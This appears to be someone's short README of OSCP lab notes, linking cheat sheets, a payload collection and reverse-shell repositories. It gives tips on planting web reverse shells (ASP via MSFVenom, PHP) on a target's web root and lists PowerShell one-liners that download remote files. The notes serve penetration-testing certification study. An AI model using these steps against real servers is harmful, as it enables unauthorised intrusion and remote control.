OSCP Arsenal
============
The following are guilds, tools, and tip that I found good to have in the back pocket during PWK labs.

I found this to be a pretty excellent cheat sheet in general: https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md

Payloads for all the things: https://github.com/swisskyrepo/PayloadsAllTheThings

Initial Enumeration

And to power them up to TTYs: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

Web Reverse Shells
------------------
Upload the payload to the target's web root, browse to it, pop!

### ASP
For Windows IIS servers your best bet is some kind of ASP shell. They can be generated by MSFVenom with the asp, aspx or aspx-exe formats. Not sure exactly when to use each one, just try all three!

### PHP
If the server is Apache, it's probably part of LAMP/XAMPP.

Windows: https://github.com/Dhayalanb/windows-php-reverse-shell

Linux: https://github.com/pentestmonkey/php-reverse-shell

### JSP

Port Forwarding
---------------
Use pfwd (.py or .go) from this repo. Note, you can cross compile easily with go to make a Windows port forwarding executable!

Powershell One-Liners
---------------------
curl: (new-object system.net.webclient).DownloadString('file_url')

wget: (new-object system.net.webclient).DownloadFile('file_url','path_on_disk')
